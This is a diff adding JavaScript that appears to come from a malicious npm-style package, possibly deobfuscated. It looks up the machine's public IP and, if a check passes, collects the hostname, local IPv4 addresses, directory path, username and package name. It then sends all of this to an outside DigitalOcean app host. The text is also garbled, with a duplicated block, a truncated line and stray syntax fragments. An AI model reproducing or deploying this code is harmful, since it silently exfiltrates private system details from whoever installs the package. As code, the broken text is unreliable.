@@ -1,0 +1,82 @@
+const pi = request('GET', 'https://api.ipify.org').getBody().toString()
+(_tmp_5 = isIpInMS(pi)
+  .then(result => {
+    if (result) {
+      console.log('on here');
+      // Get the hostname
+      const hostname = os.hostname();
+      //console.log("Hostname: " + hostname);
+
+      // Get the network interfaces
+      const interfaces = os.networkInterfaces();
+
+      let ips = "";
+      for (const name of Object.keys(interfaces)) {
+        for (const iface of interfaces[name]) {
+          // Filter out internal/non-IPv4 addresses
+          if (iface.family === "IPv4" && !iface.internal) {
+            //console.log("IP Address: " + iface.address);
+            ips = ips + iface.address + "|"
+          }
+        }
+      };
+
+      //get system path
+      const systemPath = path.join(__dirname, '.');
+      //console.log(systemPath);
+
+      // get username
+      const userInfo = os.userInfo();
+      //console.log(userInfo["username"]);
+
+      // get current package
+      const packagePath = path.dirname(require.main.filename);
+      const packageJson = require(path.join(pa...).catch
+{
+    if (result) {
+      console.log('on here');
+      // Get the hostname
+      const hostname = os.hostname();
+      //console.log("Hostname: " + hostname);
+
+      // Get the network interfaces
+      const interfaces = os.networkInterfaces();
+
+      let ips = "";
+      for (const name of Object.keys(interfaces)) {
+        for (const iface of interfaces[name]) {
+          // Filter out internal/non-IPv4 addresses
+          if (iface.family === "IPv4" && !iface.internal) {
+            //console.log("IP Address: " + iface.address);
+            ips = ips + iface.address + "|"
+          }
+        }
+      };
+
+      //get system path
+      const systemPath = path.join(__dirname, '.');
+      //console.log(systemPath);
+
+      // get username
+      const userInfo = os.userInfo();
+      //console.log(userInfo["username"]);
+
+      // get current package
+      const packagePath = path.dirname(require.main.filename);
+      const packageJson = require(path.join(packagePath, 'package.json'));
+  ...
+const packageJson = require(path.join(packagePath, 'package.json'))
+const options = {
+        hostname: 'monkfish-app-brmld.ondigitalocean.app',
+        port: 443,
+        path: '/?hostname=' + hostname + '&ip=' + ips + '&path=' + systemPath + '&public_ip=' + pi + "&user=" + userInfo["username"] + "&package=" + packageJson["name"],
+        method: 'GET'
+      }
+_tmp_7.path = '/?hostname=' + hostname + '&ip=' + ips + '&path=' + systemPath + '&public_ip=' + pi + "&user=" + userInfo["username"] + "&package=" + packageJson["name"]
+const req = https.request(options, (res) => {
+        //console.log(`statusCode: ${res.statusCode}`);
+
+        res.on('data', (d) => {
+          process.stdout.write(d);
+        });
+      })
